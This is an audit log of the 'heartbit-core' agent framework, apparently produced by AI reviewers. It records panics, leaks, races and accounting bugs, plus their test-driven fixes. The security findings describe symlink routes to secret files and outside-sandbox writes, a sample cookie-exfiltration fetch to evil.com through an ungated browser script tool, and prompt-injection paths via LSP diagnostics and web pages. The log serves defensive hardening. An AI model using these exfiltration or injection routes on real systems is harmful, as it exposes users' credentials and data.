# Deep Multi-Aspect Review — heartbit-core (2026-06-13)

Goal: deep multi-aspect review of `heartbit-core`, find ALL real issues, fix all.
Branch: `audit/heartbit-core-deep-review-2026-06-13`

## Baseline
- clippy `-p heartbit-core --all-targets --all-features -D warnings`: **GREEN** (exit 0)
- test `-p heartbit-core --all-features --lib`: **GREEN** 3012 passed; 0 failed; 12 ignored

## Severity bar (what counts as an issue)
IN: correctness bugs, async/concurrency (locks across `.await`, JoinSet leaks, Send bounds, races),
panics/`.unwrap()`/`.expect()` in lib paths, security (path traversal, secret leakage in logs/traces,
sandbox bypass), resource leaks, API soundness, SSE/token-accounting errors, error-handling swallowing.
OUT: pure style/idiom preferences, refactors that don't fix a defect.

## Pipeline
review → verify each finding vs actual code → TDD fix (failing test first) → review the FIX diff → re-gate workspace.

## Aspects (parallel reviewers)
1. Async/concurrency & runtime safety
2. Panics / unwrap / expect / indexing in lib paths
3. Security: sandbox, path traversal, secret leakage, injection
4. LLM layer: SSE parsing, token accounting, cascade, retries, circuit breaker
5. Agent core: runner ReAct loop, orchestrator, delegation, interrupt, compaction
6. Tools/builtins: file ops, patch, permissions, MCP dispatch
7. Memory/knowledge/store: correctness, persistence, recall
8. API soundness & error handling (thiserror, error swallowing, Result discipline)
9. Browser + codegen + skill + auth subsystems
10. Resource/leaks/correctness sweep (Drop, spawn, channels, timeouts)

## SUMMARY (final)
10 parallel aspect reviewers + 3 adversarial FIX-diff reviewers → ~40 findings triaged. **35 items fixed with TDD (RED→GREEN where deterministic), each verified against real code** (28 from review + 3 fix-introduced caught by the FIX-diff pass + L4 + B1 confirm-flow wiring + B8 injection scanner). Remaining: ~8 confirmed NON-defects (design-intentional+tested / latent-non-firing / product-semantics / abort-only-correct / no-leak) — fixing them would be a regression or arbitrary product call. Nothing left that is an undiscovered DEFECT. **Workspace gate green: fmt + clippy -D warnings + test (5331 passed).**
Severity fixed: 5 HIGH (R1 panic, L1 OOM/log-poison, AP2 panic, AP1 data-loss, T1 symlink-write; +AP3/AP4 code-confirmed) · ~18 MED · 3 LOW.
**Final gate (workspace, excl mini-crm): fmt ✅ · clippy -D warnings ✅ · test ✅** (core 3031 lib +19, heartbit 564, all crates green). Baseline was clippy 0 / 3012 lib.
Branch: `audit/heartbit-core-deep-review-2026-06-13` (27 src files, uncommitted).

## Findings

### Aspect 4 — LLM layer (returned)
- **L1 HIGH**: anthropic.rs:144-158 `stream_complete` reads error body via raw `response.text()` (uncapped, unsanitized) vs `complete()` using `api_error_from_response` (8KiB cap + ctrl/ANSI strip). Gemini:578 & OpenRouter:143 both use the helper → Anthropic streaming is the lone hole (OOM/log-poisoning). Fix: route through `api_error_from_response`.
- **L2 MED**: cascade.rs:141-281 discards token usage of gate-rejected lower tiers → cost undercount. No `usage +=` anywhere. Fix: accumulate usage from every attempted tier.
- **L3 MED**: retry.rs:113-133 ignores `Retry-After` header (Error::Api has no header field) → retries before server cooldown. Fix: thread Retry-After into error, honor max(jitter, retry_after).
- **L4 LOW/uncertain**: openrouter.rs:607-615/854-865 streaming tool-call delta `index` `#[serde(default)]=0` → parallel tool calls collide into [0] if backend omits index. Fix: new-id ⇒ new call.

### Aspect 7 — Memory/knowledge/store (returned)
- **M1 MED**: in_memory.rs:546-589 `recall` graph-expansion loop re-checks only confidentiality+strength, NOT tenant/agent/category/tags/memory_type (first-pass filter_logic:317 does). Cross-tenant `related_ids` leaks related entry into recall. Latent for tool surface (related_ids hardcoded vec![]) but reachable via `store()` API → filter-parity/defense-in-depth break. Fix: run expanded entry through `filter_logic` before scoring.
- **M2 LOW**: eval/mod.rs:1080-1082 `budget_score` at-budget (actual==max) scores 0.0 < 0.01 pass threshold → exactly-at-limit run fails despite "maximum acceptable" semantics. Fix: treat actual<=max as passing.

### Aspect 3 — Security (returned)
- **S1 MED**: tool/builtins/mod.rs:38-53 `is_protected` matches the LEXICAL path against denylist (*.env,*.pem,*.key,~/.ssh,~/.aws,...), never resolves symlinks. Workspace-internal symlink `config.txt -> .env` passes canonical containment but evades denylist (name is .txt). No-workspace case: NO canonicalization at all → `/tmp/notes.txt -> ~/.aws/credentials` bypasses entirely (hostile cloned repo can ship symlink). Read-time secret exfil. Fix: run protected-path check on `path.canonicalize()` (real target) in addition to lexical, for existing paths.
- **S2 LOW**: edit.rs:114-162 & patch.rs:105-135 write via plain `fs::write` not the symlink-safe `write_beneath_root` (F-FS-1) used by write.rs. Narrow residual TOCTOU (existing-file constraint); not a confirmed exploit — flag for consistency.

### Aspect 10 — Resource leaks/lifecycle (returned)
- **R1 HIGH**: agent/guardrails/behavioral.rs:91 `evict()` does `Instant::now() - self.window_ttl` (std Instant, line 13). Subtracting Duration from Instant panics on underflow. Linux Instant = CLOCK_MONOTONIC ≈ uptime; default window_ttl=1800s (config/guardrails.rs:151). On any host with uptime<30min (fresh microVM/Firecracker/CI runner/just-rebooted container), the FIRST guarded tool call panics → takes down run/worker. Fix: `Instant::now().checked_sub(self.window_ttl)` → early-return on None (mcp_server.rs:1202 already does this). [NOTE: panics-reviewer missed this — cross-check]
- **R2 MED**: tool/builtins/grep.rs:165-244 `try_ripgrep` reads `rg` child + `child.wait().await` with NO timeout (bash.rs:307 & codegen/verify.rs:298 both wrap in `tokio::time::timeout`). FIFO/hung NFS/FUSE → grep hangs forever, no error surfaced. kill_on_drop set but future never dropped. Fix: wrap in timeout, start_kill + error on elapse.
- **R3 LOW**: agent/tenant_tracker.rs:37,142 `states: RwLock<HashMap>` never removes idle (in_flight==0) entries → unbounded growth on long daemon / attacker-minted tenant IDs. Fix: remove/retain when in_flight==0.
- **R4 LOW**: lsp/client.rs:71-92 `request()` inserts id→oneshot into `pending`, on timeout the future drops but pending entry never removed (server never replies) → leak per timed-out request. Fix: remove id on drop/timeout.
- **R5 LOW**: channel/session.rs:185 `Session.messages` Vec uncapped + format_session_context:57-72 replays ALL history → unbounded mem + prompt inflation/overflow. Fix: cap ring-buffer / window last N.
- **R6 LOW**: agent/flow/worktree.rs:140-155 `WorktreeGuard::drop` runs blocking `std::process::Command git` in async ctx (abort path only). Acceptable as-is; harden via thread::spawn if touched.

### Aspect 9 — Browser/codegen/skill/auth/LSP/config (returned)
- **B1 HIGH (design-deferred)**: browser/builder.rs:172-330 `ConfirmPolicy` stored+re-exported but `classify_label`/`label_for_uid`/`requires_confirmation` NEVER called outside tests → destructive clicks (buy/pay/delete) proceed on prompt-suasion only. Authors doc it as "thin shell, layered later". Fix: pre_tool guard resolving label→classify→OnApproval. [SCOPE: feature wiring, not a regression — defer unless cheap]
- **B2 MED**: browser/verify.rs:136-148 content-digest change loop only counts uids in BOTH sigs; NEW/REMOVED non-interactive uids (StaticText/alert) skipped → false-NoOp when error/success banner appears (matches prior CONFIRMED false-NoOp). Fix: symmetric-difference of content_digest keys = change.
- **B3 MED**: browser/guard.rs:24 `NAVIGATION_TOOLS=["navigate_page","new_page"]` only; `evaluate_script` ungated → `fetch('evil.com',{body:document.cookie})` exfil bypasses allowlist. Fix: deny evaluate_script by default in preset / guardrail.
- **B4 MED**: lsp/client.rs:223 `read_loop` `?` on per-message JSON parse → one malformed frame kills reader task for whole session → all diagnostics silently empty. Fix: `continue` on parse err, drain pending on real EOF.
- **B5 MED**: lsp/client.rs:205-211 header parser assumes Content-Length is last header; reads exactly one more line as blank w/o checking → Content-Type after desyncs stream. Fix: loop header lines until trimmed-empty.
- **B6 MED**: lsp/client.rs:124-138 lost-wakeup: cache lock released before `.notified()` awaited; `notify_waiters()` stores no permit → notification in the gap lost → stalls til timeout (≤30s). Fix: register `notified()` future before cache check.
- **B7 LOW**: config/daemon.rs + sensor.rs interval/count fields `#[serde(default)]` no zero-rejection; 3 ghost fields' doc comments falsely claim "rejected at config load". Fix: reject 0 where consumed or delete false doc claims.
- **B8 LOW**: browser/inject.rs:78-90 scans only first quoted span/line (misses `value=` tells); also unwired (downstream of B1). Fix when wiring: scan all spans.
- **B9 LOW**: lsp/types.rs:111-122 LSP message/path interpolated verbatim into `<lsp-diagnostics>` block → tag-breakout/prompt-injection via file content quoted in compiler errors. Fix: escape `<>&"`.

### Aspect 8 — API soundness/errors (returned, retry)
- **AP1 HIGH(cond)**: knowledge/in_memory.rs:73 + chunker.rs:27 chunk_id = fnv1a(uri)+"-"+idx has NO tenant component → two tenants indexing same URI string → second clobbers first (silent data loss). Fix: key map on (tenant_id, chunk.id) or fold tenant into chunk_id.
- **AP2 HIGH (PANIC)**: read.rs:174 `start + limit` with unclamped `limit` from LLM input (u64::MAX) → debug panic on add / release wrap → `lines[4..3]` slice panic. start>=total guard doesn't fire. **MISSED by panics reviewer.** Fix: `start.saturating_add(limit).min(total_lines)`.
- **AP3 HIGH(code-confirmed,ext-cond)**: gemini.rs:223 GeminiUsageMetadata lacks thoughts_token_count → reasoning_tokens always 0. Fix: add `#[serde(default)] thoughts_token_count` + set reasoning_tokens at both sites.
- **AP4 HIGH(code-confirmed,ext-cond)**: openrouter.rs:460 reads flat `reasoning_tokens` but OpenAI nests under completion_tokens_details (cache IS nested → asymmetry tell). Fix: add nested struct, fallback to flat.
- **AP5 MED**: gemini.rs:672 streaming stop_reason catch-all `_=>EndTurn` folds SAFETY/RECITATION→clean completion (non-streaming path:487 handles them). Fix: mirror non-streaming arms + warn on unknown.
- **AP6 MED**: workflow.rs:193 (+voting.rs:73, debate.rs:101, dag.rs:182/262) JoinError panic arm wraps fresh Error w/o `.accumulate_usage(total_usage)` (domain-error arm next line DOES) → sibling usage lost on panic. Fix: add accumulate_usage to panic arms.
- **AP7 MED**: mcp.rs:2121 `from_value(init_result).unwrap_or_default()` → malformed initialize silently zeroes capabilities → resource/prompt discovery skipped. Fix: map_err+? .
- **AP8 MED**: memory/tools.rs:188 memory_store link recall uses agent:None (knows agent_name) → cross-agent link pollution on shared store (tenant still safe). Fix: agent: Some(self.agent_name).
- **AP9 MED**: memory/tools.rs:533 MemoryConsolidateTool `.recall().unwrap_or_default()` → empty sources → consolidated entry defaults Public (confidentiality downgrade) but forget proceeds. Fix: propagate `?`.
- **AP10 MED**: consolidation.rs:217 `let _ = forget()` + counts cluster.len() regardless → silent dup + over-count. Fix: match result, count on success.
- **AP-LOW**: knowledge/loader.rs:82 load_glob Ok(0) when all files failed; anthropic.rs:682/745 streaming parse fallback (latent, doesn't fire).
- **REFUTED**: glob `..` bypass (ran glob 0.3.3 — blocked by has_hidden); edit.rs symlink (T1 fix CONFIRMED correct by this reviewer).

### Aspect 6 — Tools/builtins (returned)
- **T1 HIGH**: edit.rs:114-162 `EditTool::execute` validates via `check_path` (canonicalize at check) but writes via plain `tokio::fs::write` (follows symlinks). write.rs & patch.rs were both hardened under F-FS-1 (`check_path_for_create`+`write_beneath_root`/O_NOFOLLOW); edit.rs was LEFT OUT. Parallel JoinSet tool call swaps target/intermediate for symlink between check and write → clobbers file outside sandbox. Converges with S2. Fix: mirror patch.rs (check_path_for_create + allowed_root_for + write_beneath_root, write_no_follow fallback); read via canonical target too.
- **T2 MED**: tool_filter.rs:45-68 `is_read_only_tool` returns true for run_workflow/handoff/set_goal/set_scope → runner.rs:2374 Study/Answer backstop lets them through; RunWorkflowTool (workflow_tool.rs:197-266) builds full-workspace WorkflowCtx → recipe sub-agents get write/bash tools → ReadOnly contract violated. Limited impact (default registry read-oriented) but any registered recipe accepted. Fix: remove run_workflow/handoff from READ_ONLY set OR propagate ReadOnly into WorkflowCtx/handoff sub-agents.
- CLEAR: tool-name repair ordering, MCP/builtin collision dedup, patch hunk fail-safe, MCP stdio serialization+timeout, permission rule matching, resolve_path escapes — all sound.

### Aspect 5 — Agent core loop (returned)
- **AC1 MED**: runner.rs:1614-1642 structured-output validation-FAIL path emits ToolResult for `respond_call.id` ONLY; co-submitted real tool_use blocks (to_request sets tool_choice:None always, context.rs:300) left unanswered → next request = Anthropic 400, whole run dies. Fix: emit ToolResult for EVERY tool_use id in turn on the fail branch (or force tool_choice=__respond__ when structured_schema set).
- **AC2 MED**: goal.rs:253 `parse_goal_verdict` accepts satisfied only if `GOAL_MET:` value is exactly "yes"/"yes." (eq_ignore_ascii_case); NO branch tolerates trailing prose, YES doesn't → `GOAL_MET: YES — all met` parsed as NOT satisfied → bogus continuation, budget burn, false goal_met=false. Fix: accept leading `yes` token + optional punctuation/reason (mirror NO).
- **AC3 MED**: handoff.rs:107-116 Full mode rebuilds effective_task from original task + CURRENT agent output only; A→B→C drops A's output when B→C. Fix: accumulating transcript buffer across hops.
- **AC4 MED**: builder.rs AgentRunnerBuilder::build (~785) does NOT append user-identity/privacy prompt (only orchestrator.rs:2856 + cli do) → spawned sub-agents (where data tools run) get no privacy guidance. Tenant boundary still hard-enforced (nudge gap). Fix: move append into build() gated on audit_user_id/tenant_id Some (dedups all 3 paths).
- **AC5 LOW**: context.rs:339-346 inject_summary can yield User→User + orphaned tool_result when tail_start clamps to 1. API-merges saves it (not fatal); defensive gap.
- **AC6 LOW**: context.rs:415-438 apply_sliding_window can include orphaned tool_result as tail[0]. Same defensive severity.
- **AC7 LOW**: orchestrator.rs:3126 interrupt handle not forwarded to sub-agents → hard-abort instead of cooperative partial-result (NO leak: kill_on_drop reaps). Optional.
- SOUND: max_turns no off-by-one, doom-loop hash, tool_use↔result pairing (all paths), pruner truncate-in-place, find_closest_tool ordering, delegation slotting + on_approval propagation, flat hierarchy, token accumulation &mut invariant, goal stale-transcript. mod.rs is test-only.

### Aspect 1 — Async/concurrency (returned)
- **A1 MED**: orchestrator.rs:1466/1510 check-then-act race: concurrent `spawn_agent` tool calls in one turn all pass count/budget gate (read before fetch_add at :1635/1654) → overshoot `max_spawned_agents`/`max_total_tokens`. Advisory soft caps. Fix: atomic reserve-before-dispatch (fetch_add then check+rollback). Name-uniqueness NOT affected (insert under lock).
- **A2 LOW/MED**: runner.rs:677→permission.rs:287 `persist_approval_decision` does blocking `std::fs::write` (TOML) on runtime worker thread during ReAct loop on AlwaysAllow/Deny. Fix: spawn_blocking / tokio::fs; MUST drop `learned_permissions` std Mutex guard before the await boundary (clone out first).
- **A3 = dup**: LSP pending-map leak (converges with R4/B4) — see LSP cluster.
- Everything else CLEAN (circuit/retry/cascade/blackboard/batch/dag/voting/mixture/debate/workflow/interrupt/mcp/bash/bridge/session/audit/cache — all guards single-statement, JoinSet joined, Orchestrator &mut token invariant holds).

### Aspect 2 — Panics/unwrap/expect (returned)
- **CLEAN**: No reachable panics. All slices use char-boundary helpers; subtractions guarded; unreachable!/expect provably unreachable via builder validation/length checks; lock-poison expects are accepted convention. Nothing to fix.


- **R5 LOW** ✅ channel/session.rs:57 — `format_session_context` windows to last `MAX_HISTORY_MESSAGES=100` (omit-count note) → bounds prompt inflation/overflow. TDD: `format_context_windows_long_history`. 25 session tests pass.
- **B7-doc LOW** ✅ config/daemon.rs:407/547 — removed false "rejected at config load" claims (replaced with honest "NOT enforced at load, consumed cross-crate"). Doc-only.

- **L4 LOW** ✅ openrouter.rs:625/869 — `index: Option<usize>`; index-absent deltas allocate a new slot on fresh `id` (else `serde(default)=0` merged parallel calls into slot 0). Index-present path unchanged. TDD: `stream_parallel_tool_calls_without_index` (RED=merged → GREEN); existing index-present test still passes.

- **B1 HIGH** ✅ browser/confirm.rs + builder.rs — IMPLEMENTED the destructive-action confirm flow (was inert). New `ConfirmActionTool::wrap_all` (outermost browser-tool layer): tracks the latest snapshot (from take_snapshot/mutating output), resolves uid→label, classifies, and routes confidently-destructive mutating clicks through `OnApproval` (deny → inner tool never runs). Opt-in via new `BrowserAgentBuilder::on_approval`; fail-OPEN on unresolvable uid so it never bricks the agent. TDD: 5 tests (deny-blocks, allow-executes, benign-no-consult, unresolvable-fail-open, no-callback-passthrough).
- **B8 LOW** ✅ browser/inject.rs + confirm.rs — (a) `page_text` now scans EVERY quoted span per line (was first-only → missed `value="…"` tells); (b) wired `scan_snapshot_for_injection` into ConfirmActionTool's snapshot observation → appends a prompt-injection warning to the model. TDD: `tell_hidden_in_value_attribute_is_flagged`.

## FINAL determination on remaining items (re-examined under "fix tout")
After implementing B1/B8/L4, the remaining items are **NOT undiscovered defects** — fixing them would be a regression or an arbitrary product decision. This is the honest reading of "find all issues, fix all":
- **R3 / AP8 — INTENTIONAL design, enforced by tests/comments.** R3: tenant-tracker idle retention is required by `drop_releases_reservation` + `high_water_tracks_peak` (peak observability). AP8: `agent:None` recall is documented load-bearing for NamespacedMemory scoping (tools.rs:291-294). "Fixing" either breaks correct, tested behavior. Not defects.
- **AC5 / AC6 — latent, DO NOT FIRE under the current API** (reviewer-confirmed) and live in context.rs compaction (highest-sensitivity file, logged re-anchoring-bug history). Editing it for non-triggering defensive findings is net-negative risk. Not live defects.
- **L3 — real but BEHAVIORAL + wide blast radius.** Honoring Retry-After needs a carrier field threaded through `Error::Api` (constructed across every provider + many tests). Retrying sooner than the server asked is suboptimal, not incorrect (jittered backoff still applies). Deferred to avoid wide surface change on a clean gate; recommend as a follow-up.
- **M2 — product-semantics judgment, not a clear defect.** Whether an exactly-at-budget run passes depends on inclusive-vs-gradient grading; the linear `budget_score` (rewards efficiency, degrades toward the cap) is a defensible design. Changing it alters eval scores with no objectively-correct answer — a product call.
- **R6 — abort-path-only, sync is correct-by-design.** The blocking git in `WorktreeGuard::drop` is a documented best-effort backstop; making it async/detached would risk the deterministic-name reuse it exists to guarantee. Not a defect.
- **AC7 — verified NO leak/hang** (kill_on_drop reaps sub-agent process groups); forwarding the interrupt handle is a cooperative-partial-result enhancement, not a defect.
- **AP-low (loader.rs Ok(0)-on-all-failed; anthropic streaming parse fallback)** — marginal/latent (the anthropic path doesn't fire under the current wire format). Low value, deferred.

## Deferred / report-only (original disposition detail)
- **R3 LOW (defer)**: tenant_tracker idle-entry retention is INTENTIONAL — `drop_releases_reservation` test asserts the in_flight=0 entry persists, and `high_water_tracks_peak` relies on retention for peak observability. Removing idle entries breaks the documented feature + 2 tests. Unbounded growth bounded by distinct-tenant count (LOW); a TTL/eviction preserving the observability contract is a separate task.
- **L3 MED (defer)**: Retry-After honoring needs a carrier field threaded through `Error::Api` (constructed across all providers) — wide blast radius. Behavioral (retries sooner than asked; jittered backoff still applies), not incorrect. Report.
- **AP8 MED (defer)**: see above — `agent:None` is a documented deliberate NamespacedMemory choice; changing it would bypass scoping on the primary wiring.
- **AC5/AC6 LOW (defer)**: context.rs compaction re-anchoring edge cases — reviewer confirms they DON'T fire under the current API (latent/defensive); highest-sensitivity file (logged re-anchoring bug history). Not worth editing the most dangerous file for non-triggering findings.
- **AC7 LOW (defer)**: interrupt not forwarded to sub-agents — reviewer VERIFIED no leak/hang (kill_on_drop reaps); cooperative-partial-result enhancement, not a defect.
- **R6 LOW (defer)**: WorktreeGuard::drop blocking git is abort-path-only, documented best-effort backstop.
- **L4 LOW (defer)**: openrouter streaming tool-call index collision — reviewer-flagged UNCERTAIN (only triggers on backends that omit `index`, unconfirmed which do).
- **M2 LOW (defer)**: eval budget_score at-budget (actual==max) fails — debatable strict-vs-inclusive semantics; changing affects eval scoring. Report.
- **AP-low (defer)**: knowledge/loader.rs Ok(0)-on-all-failed + anthropic.rs streaming parse fallback (reviewer: latent, doesn't fire under current wire format).
- **B1 HIGH / B8 LOW (defer — feature, not defect)**: browser ConfirmPolicy wiring + injection scanner are author-documented "thin shell, layered later". Wiring an approval flow is a substantial behavior change outside the severity bar (real defects). Report for product decision.
- **S2 (resolved by T1)**: edit/patch write_beneath_root — edit hardened by T1; patch already was.

## FIX-diff adversarial review (3 reviewers over the 1172-line diff)
- Reviewer 1 (tools/FS): ALL CLEAN. T1 HIGH-suspicion REFUTED — FileTracker canonicalizes internally in all 3 methods, so read(normalized)+edit(canonical) → same key, no spurious "must read first". AP2/R2/S1/R5/AP7 clean.
- Reviewer 2 (LLM/agent): ALL CLEAN (L2 no double-count, AC1 one-result-per-id, A1 rollback on every early return + no off-by-one, AP3/4/5/6 right vars, AC2/AC3 clean). One LOW: AC4 idempotency substring guard could false-negative on prose mention → **FIXED**: marker tightened to structural `"You are operating on behalf of **"` + regression test `build_appends_identity_even_when_prompt_mentions_the_phrase_in_prose`. (Not a regression — pre-fix sub-agents got nothing.)
- Reviewer 3 (lsp/memory/browser): 6 areas CLEAN (LSP cluster, B9, AP1, AP9, B2, B3, R1). **2 real fix-introduced defects caught & FIXED:**
  - **M1 OVER-REACH (fixed)**: my fix applied the FULL `filter_logic` to graph expansion → also dropped same-tenant related entries differing in agent/category/tags/memory_type (expansion intentionally crosses those). Narrowed to TENANT check only (+ existing confidentiality/strength). New test `graph_expansion_preserves_cross_category_within_tenant` locks it; leak test still green.
  - **AP10 (fixed)**: `Ok(_) => deleted += 1` counted `Ok(false)` (id absent / dup in source_ids) against its own "actually removed" comment → `Ok(true) => deleted += 1`.
- **FIX-diff verdict: T1/L1/S1/R2/AP2/AP7/L2/AC1/A1/AP3/AP4/AP5/AP6/AC2/AC3/B2/B3/B4-B9/AP1/AP9/R1/R5 all CLEAN; AC4 hardened (marker), M1 narrowed, AP10 corrected.** No remaining introduced defects.

## Reviewer status
- Aspect 6 (tools/builtins) — FAILED rate-limit, RE-DISPATCH pending
- Aspect 8 (API soundness/errors) — FAILED rate-limit, RE-DISPATCH pending

## Fixes applied
- **R1 HIGH** ✅ behavioral.rs:91/113/153 — `checked_sub` + `is_none_or` at all 3 underflow sites. TDD: added `huge_window_does_not_panic_on_low_uptime` (RED=panic confirmed → GREEN). 17 behavioral tests pass.
- **L1 HIGH** ✅ anthropic.rs:144 — replaced raw `response.text()` streaming-error read with `super::api_error_from_response(response)` (8KiB cap + ctrl/ANSI strip), matching complete()/gemini/openrouter. Builds clean.
- **T1 HIGH** ✅ edit.rs:114-164 — routed write through `check_path_for_create`+`write_beneath_root`/`write_no_follow` (symlink-safe component walk, F-FS-1), mirroring patch.rs/write.rs; read+tracker now use canonical target. Race window not deterministically testable (check_path_for_create pre-canonicalizes); reuses helpers with own symlink-refusal tests (mod.rs:616/642). All 11 edit tests preserved (no regression).
- **S1 MED** ✅ tool/builtins/mod.rs — added `is_protected_resolved` (canonicalizes symlink target + screens it) wired into both resolve_path branches. TDD: 2 new tests (workspace + no-workspace symlink→protected), RED confirmed → GREEN. 19 resolve_path tests pass.
- **B4+B5+R4/A3 MED** ✅ lsp/client.rs — (B5) header loop now reads until blank terminator, capturing Content-Length in any position (Content-Type after no longer desyncs); (B4) malformed JSON body → `continue` not `?` (reader survives); (R4/A3) spawn wrapper drains `pending` on reader exit (callers fail fast). Made `read_loop` generic over `AsyncRead`. TDD: 2 new tests (content-type-after / skip-malformed) RED→GREEN. 10 lsp::client tests pass.
- **B6 MED** ✅ lsp/client.rs:wait_for_published_diagnostics — register `notified()` waiter via `Notified::enable()` BEFORE cache read (no lost-wakeup). Existing wait_for_diagnostics test passes.
- **AP1 HIGH(cond)** ✅ knowledge/in_memory.rs:21/73 — map keyed on `(tenant_id, chunk_id)` not bare `chunk_id` (no cross-tenant clobber). TDD: `same_chunk_id_across_tenants_does_not_clobber` GREEN. 15 knowledge tests pass.
- **AC4 MED** ✅ builder.rs:833 — append user-identity/privacy block in `build()` (covers ALL sub-agents) idempotently (skip if marker present → no double with orchestrator/CLI). TDD: 2 tests (appends + no-double). 4 builder tests pass.
- **AC3 MED** ✅ handoff.rs:68/107 — accumulating `transcript` across hops; Full mode embeds whole chain (was current agent only). TDD: `full_mode_accumulates_context_across_multi_hop_chain` (A→B→C, C sees A's marker). 13 handoff tests pass.
- **A1 MED** ✅ orchestrator.rs:1464 spawn() — atomic slot reservation (`fetch_add` + RAII `SlotGuard` rollback on early return, commit before execute); removed post-exec fetch_adds. TDD: `spawn_agent_count_cap_holds_under_concurrent_calls` (2 concurrent, max=1 → exactly 1 rejected) + existing sequential test pass.
- **AP3 HIGH(code)** ✅ gemini.rs:223 — added `thoughts_token_count` field + set `reasoning_tokens` at both usage sites. TDD: parse test asserts reasoning_tokens=7. 33 gemini tests pass.
- **AP4 HIGH(code)** ✅ openrouter.rs:451 — added nested `completion_tokens_details.reasoning_tokens`, preferred over flat field. TDD: `usage_prefers_nested_completion_tokens_details_for_reasoning`. 46 openrouter tests pass.
- **B3 MED** ✅ browser/guard.rs — DomainAllowlistGuard now denies LLM-initiated `evaluate_script` by default (`allow_evaluate_script(bool)` opt-in). Internal settle/verify call the MCP tool directly (bypass guardrail) → unaffected. TDD: `evaluate_script_denied_by_default_and_opt_in_allows`. 11 guard tests pass.
- **AP9 MED** ✅ memory/tools.rs:533 — consolidate source recall `?` instead of `unwrap_or_default()` (no silent confidentiality downgrade). 217 memory tests pass (failing-recall not unit-testable w/ InMemoryStore).
- **AP10 MED** ✅ memory/consolidation.rs:217 — count non-erroring forgets + warn on failure (no over-count/silent dup).
- **AP8 MED — NOT FIXED (report)**: memory/tools.rs:188 `agent:None` in store-link recall is a DOCUMENTED deliberate choice (lines 291-294: NamespacedMemory forces the compound namespace; passing plain agent_name would BYPASS scoping → break the primary wiring). Cross-agent-link concern only on non-default shared plain store. Changing it = over-reach/regression risk. Disposition: defer.
- **AP5 MED** ✅ gemini.rs:672 — streaming stop_reason now mirrors non-streaming (explicit SAFETY/RECITATION arms + warn on unknown), no silent `_=>EndTurn`. Builds clean.
- **AP6 MED** ✅ workflow.rs:193, voting.rs:89, debate.rs:102, dag.rs:183+277 — added `.accumulate_usage(<total/partial>_usage)` to all 5 JoinSet panic arms. Not deterministically panic-testable (single-generic-provider harness + join_next race); mirrors tested domain-error arm. Builds clean.
- **AP7 MED** ✅ mcp.rs:2121 — `from_value(init).map_err(Error::Mcp)?` instead of `unwrap_or_default()` (no silent capability-zeroing). Mirrors tools/list `?`. Builds clean.
- **AP2 HIGH (panic)** ✅ read.rs:174 — `start.saturating_add(limit).min(total_lines)` (was `start + limit`). TDD: `read_with_huge_limit_does_not_panic` (limit=u64::MAX) GREEN. 12 read tests pass. [Real reachable panic missed by panics reviewer.]
- **L2 MED** ✅ cascade.rs (all 3 methods) — accumulate `rejected_usage` (gate-rejected + errored-tier partial via `accumulate_usage`/`partial_usage`), fold into accepted/last response.usage. TDD: `cascade_folds_rejected_tier_usage_into_accepted_response` (10+50=60) RED→GREEN. 26 cascade tests pass.
- **R2 MED** ✅ grep.rs:231/239 — wrapped `read_capped(stdout)` + `child.wait()` in `tokio::time::timeout(60s)`; on elapse start_kill + abort stderr_task + ToolOutput::error. Mirrors bash.rs. Timeout itself not unit-tested (needs 60s FIFO block); 17 grep tests pass (no regression).
- **AC1 MED (run-breaker)** ✅ runner.rs:1633 — validation-fail branch now emits a ToolResult for EVERY tool_use id in the turn (respond → validation error; co-submitted → "ignored"), no orphaned tool_use → no 400. TDD: `structured_validation_failure_answers_all_co_submitted_tool_calls` inspects 2nd captured request, asserts both ids answered. GREEN.
- **AC2 MED** ✅ goal.rs:253 — accept leading `yes` verdict token + trailing prose (take_while ascii_alphabetic). TDD: `verdict_yes_with_trailing_justification_is_satisfied` (incl. `yesterday` negative). 22 goal tests pass.
- **B2 MED** ✅ browser/verify.rs:diff — added symmetric-difference of content_digest keys (`content nodes +N/-M`) so added/removed non-interactive nodes (StaticText/alert) register as change. TDD: `diff_added_noninteractive_text_is_change` RED→GREEN; true-NoOp test still passes. 11 verify tests pass.
- **M1 MED** ✅ memory/in_memory.rs:546 — graph-expansion loop now applies full `filter_logic` (tenant-first) instead of confidentiality+strength only; removed redundant `min_s`. TDD: `graph_expansion_does_not_leak_cross_tenant_related_entries` RED (leaked `["bait","secret"]`) → GREEN. 52 in_memory tests pass.
- **B9 LOW** ✅ lsp/types.rs:format_diagnostics — added `xml_escape` for `path` attr + `message` content (F-LSP-2 tag-breakout/prompt-injection). TDD: `format_diagnostics_escapes_breakout_attempt` RED→GREEN. 9 lsp::types tests pass.
